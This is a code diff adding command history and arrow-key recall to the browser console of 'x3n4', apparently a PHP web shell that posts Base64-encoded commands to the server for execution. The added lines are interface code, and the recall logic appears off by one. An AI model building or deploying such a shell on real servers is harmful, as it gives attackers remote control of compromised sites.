@@ -330,11 +330,16 @@ if (isset($_REQUEST['cmd'])) {
         function x3n4 () {
             this.version = '<?php echo X3N4_VERSION; ?>';
             this.script_path = '<?php echo $_SERVER['REQUEST_URI']; ?>';
+
+            this.history = [];
+            this.key_count = -1;
+
             this.execCommand = function(command) {
                 if (command.trim() == 'clear') {
                     $('#stdout').html('');
                     return;
                 }
+                this.history.push(command);
                 command = Base64.encode(command);
                 $('#stdout').append($('#pwd').html() + " " + Base64.decode(command) + "\n");
                 $.post(this.script_path, {cmd: command}, function(data) {
@@ -363,10 +368,35 @@ if (isset($_REQUEST['cmd'])) {
                     }
                 });
             }
+            this.bindKeyboardEvents = function() {
+
+                $('#stdin').on('keydown', { history : this.history, count : this.key_count }, function (ev) {
+                    var code = (ev.keyCode ? ev.keyCode : ev.which);
+                    switch (code){
+                        case 38:
+                            if(ev.data.history.length > 0){
+                                if ((ev.data.count + 1) < ev.data.history.length){
+                                    ev.data.count++;
+                                    $('#stdin').val(ev.data.history[ev.data.history.length - ev.data.count]);
+                                }
+                            }
+                            break;
+                        case 40:
+                            if(ev.data.history.length > 0){
+                                if ((ev.data.count - 1) in ev.data.history){
+                                    ev.data.count--;
+                                    $('#stdin').val(ev.data.history[ev.data.count]);
+                                }
+                            }
+                            break;
+                    }}
+                );
+            }
         }
         window.x3n4 = new x3n4();
         window.x3n4.declareCallbacks();
         window.x3n4.checkUpdate();
+        window.x3n4.bindKeyboardEvents();
     </script>
 </body>
 </html>
